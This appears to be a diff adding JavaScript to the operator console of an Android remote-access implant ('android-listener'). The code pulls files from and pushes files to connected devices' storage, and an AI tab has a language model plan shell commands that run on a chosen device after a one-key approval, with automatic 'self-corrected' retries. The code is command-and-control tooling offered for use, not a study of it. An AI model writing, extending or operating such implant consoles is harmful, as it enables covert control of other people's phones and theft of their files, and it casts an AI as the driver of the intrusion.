+  const r=await api('/api/android-listener/download',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({port:p,path:path,client_id:alGetClientId()})});
+  if(r&&r.error){alert(r.error);return;}
+  const el=document.getElementById('alTerm');
+  const div=document.createElement('div');div.className='l c';div.textContent='DOWNLOAD: '+path;el.appendChild(div);el.scrollTop=el.scrollHeight;
+}
+async function alUpload(){
+  const file=document.getElementById('alUploadFile').files[0];
+  if(!file){alert('Select a file');return;}
+  const p=parseInt(document.getElementById('alPort').value)||8080;
+  const remote=document.getElementById('alUpPath').value.trim()||'/storage/emulated/0/'+file.name;
+  const fd=new FormData();
+  fd.append('port',p);fd.append('client_id',alGetClientId());fd.append('remote_path',remote);fd.append('file',file);
+  const r=await api('/api/android-listener/upload',{method:'POST',body:fd});
+  if(r&&r.error){alert(r.error);return;}
+  const el=document.getElementById('alTerm');
+  const div=document.createElement('div');div.className='l c';div.textContent='UPLOAD -> '+remote;el.appendChild(div);el.scrollTop=el.scrollHeight;
+}
+
+function alTab(name){
+  document.querySelectorAll('.tabs .tab').forEach((t,i)=>t.classList.toggle('active',['terminal','ai','commands','files'][i]===name));
+  document.querySelectorAll('.tabcontent').forEach(t=>t.classList.remove('active'));
+  document.getElementById('alTab'+name.charAt(0).toUpperCase()+name.slice(1)).classList.add('active');
+  if(name==='files')alLoadDownloaded();
+}
+
+async function loadAssets(){
+  const d=await api('/api/settings');if(!d)return;
+  if(d.bg){document.body.style.backgroundImage=`url(${d.bg}?t=${Date.now()})`;document.body.style.backgroundSize='cover';document.body.style.backgroundPosition='center';document.body.style.backgroundAttachment='fixed';document.body.classList.add('has-bg');}
+  if(d.logo){document.getElementById('hdrLogoEl').innerHTML=`<img src="${d.logo}?t=${Date.now()}" alt="logo">`;}
+}
+loadAssets();
+
+// ---- AI prompt for Android (platform:"android") -------------------------
+// Same two-Enter flow as the Windows panel: Enter proposes, Enter runs, Esc
+// cancels. The implant splits on the first ':' and dispatches the prefix to a
+// fixed verb table, so the model is told to emit SHELL: for shell work and
+// cybai rejects anything that is not a known verb before it reaches a device.
+let alAiPending=null, alAiBusy=false;
+
+function alAiEnable(){
+  const ok=!!alClientId;
+  document.getElementById('alAiIn').disabled=!ok||alAiBusy;
+  document.getElementById('alAiGo').disabled=!ok||alAiBusy;
+  document.getElementById('alaic').textContent=ok?`[ ${String(alClientId).substring(0,12)}... ]`:'no device';
+}
+function alAiLog(html){
+  const l=document.getElementById('alAiLog');
+  const e=l.querySelector('.emp');if(e)e.remove();
+  l.insertAdjacentHTML('beforeend',html);
+  l.scrollTop=l.scrollHeight;
+}
+function alAiSetBusy(b){alAiBusy=b;alAiEnable();
+  document.getElementById('alAiGo').textContent=b?'...':'PLAN';}
+function alAiAwaiting(){return !!alAiPending&&
+  document.getElementById('alAiApprove').style.display!=='none';}
+function alAiPort(){return parseInt(document.getElementById('alPort').value)||8080;}
+
+document.getElementById('alAiIn').addEventListener('keydown',e=>{
+  if(e.key==='Escape'){if(alAiPending)alAiCancel();return;}
+  if(e.key!=='Enter'||e.shiftKey)return;
+  e.preventDefault();
+  if(alAiBusy)return;
+  if(alAiAwaiting())alAiRun();else alAiPlan();
+});
+
+async function alAiHealth(){
+  const h=await api('/api/ai/health');
+  const el=document.getElementById('alaic');
+  if(!alClientId)return;
+  if(h&&h.ok)el.style.color='var(--dim)';
+  else{el.textContent='model unavailable';el.style.color='var(--red)';}
+}
+
+async function alAiPlan(){
+  const prompt=document.getElementById('alAiIn').value.trim();
+  if(!prompt||alAiBusy)return;
+  if(!alClientId){alAiLog('<div class="emp"><div class="b">&#9881;</div>Waiting for a device</div>');return;}
+  alAiPending=null;document.getElementById('alAiApprove').style.display='none';
+  alAiLog(`<div style="margin:8px 0;"><span style="color:var(--dim)">you:</span> ${alAiEsc(prompt)}</div>`);
+  alAiLog('<div style="margin:8px 0;color:var(--dim)">planning... <span style="opacity:.6">(Enter again to run it)</span></div>');
+  alAiSetBusy(true);
+  let r;
+  try{
+    r=await api('/api/ai/plan',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({client_id:alClientId,port:alAiPort(),platform:'android',prompt})});
+  }finally{alAiSetBusy(false);}
+  if(!r||r.error){
+    alAiLog(`<div style="margin:8px 0;color:var(--red)">plan failed: ${alAiEsc(r&&r.error||'no response')}</div>`);return;}
+  alAiPending={prompt,command:r.command};
+  document.getElementById('alAiCmd').textContent=r.command;
+  document.getElementById('alAiApprove').style.display='block';
+  document.getElementById('alAiIn').focus();
+}
+function alAiCancel(){
+  alAiPending=null;
+  document.getElementById('alAiApprove').style.display='none';
+  alAiLog('<div style="margin:8px 0;color:var(--dim)">cancelled</div>');
+  document.getElementById('alAiIn').focus();
+}
+async function alAiRun(){
+  if(!alAiPending||!alClientId||alAiBusy)return;
+  const {prompt,command}=alAiPending;
+  alAiPending=null;
+  document.getElementById('alAiApprove').style.display='none';
+  alAiLog(`<div style="margin:8px 0;"><code style="color:var(--green)">$ ${alAiEsc(command)}</code></div>`);
+  alAiLog('<div style="margin:8px 0;color:var(--dim)">running...</div>');
+  alAiSetBusy(true);
+  let r;
+  try{
+    r=await api('/api/ai/run',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({client_id:alClientId,port:alAiPort(),platform:'android',prompt,command})});
+  }finally{alAiSetBusy(false);}
+  if(!r||r.error){
+    alAiLog(`<div style="margin:8px 0;color:var(--red)">run failed: ${alAiEsc(r&&r.error||'no response')}</div>`);return;}
+  (r.steps||[]).slice(1).forEach(s=>{
+    alAiLog(`<div style="margin:4px 0"><code style="color:var(--yellow)">$ ${alAiEsc(s.command)}</code>
+      <span style="color:var(--dim)">(self-corrected)</span></div>`);
+  });
+  alAiLog(`<div style="margin:4px 0;padding:6px 8px;background:rgba(0,0,0,.35);border-radius:4px;
+    white-space:pre-wrap;font-family:'JetBrains Mono',monospace;font-size:11px;">${alAiEsc(r.output||'(no output)')}</div>`);
+  alAiLog(`<div style="margin:8px 0 14px 0;color:var(--cyan)">${alAiEsc(r.answer||'')}</div>`);
+  document.getElementById('alAiIn').value='';
+  document.getElementById('alAiIn').focus();
+}
+const alAiEsc=s=>String(s==null?'':s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
+setInterval(alAiHealth,15000);
+</script>
+</body>
+</html>
